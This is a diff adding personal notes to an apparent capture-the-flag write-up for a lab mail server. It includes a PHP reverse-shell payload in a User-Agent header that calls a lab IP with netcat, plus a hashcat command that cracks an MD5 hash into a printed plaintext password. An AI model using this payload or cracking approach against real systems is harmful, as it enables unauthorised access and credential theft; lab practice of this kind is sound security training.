@@ -217,4 +217,27 @@ Internal=1
 
 But I still have no idea how to leverage this...
 
+I could try to hashcat the passwords and just assume the admin is Ruy since hes on the IT team.
+
+So i found [this page](https://a3h1nt.medium.com/from-local-file-inclusion-to-reverse-shell-774fe61b7e1e) about how to leverage Local File Inclusion to get a reverse shell.
+
+Lets try this. Changing the user agent to this: `<? passthru(“nc -e /bin/sh 10.10.14.137 4444”); ?>`
+
+And starting a netcate on 4444
+
+I get bad request poorly formed.
+
+And I don't see an easy way to get the other type of file on windows.
+ Maybe I crack those hashes and try and try to get on the mail server.
+
+Seems to be an md5 hash.
+`hashcat --force -m 0 hash.txt /Users/noneya/Useful/Wordlists/rockyou.txt`
+
+841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
+
+Doesn't seem the other password is crackable.
+
+I can't access the mail server with ruy@mailing.htb, admin@mailing.htb, or maya@mailing.htb
+
+I'm stumped and the discussion posts here are not helpful.
 
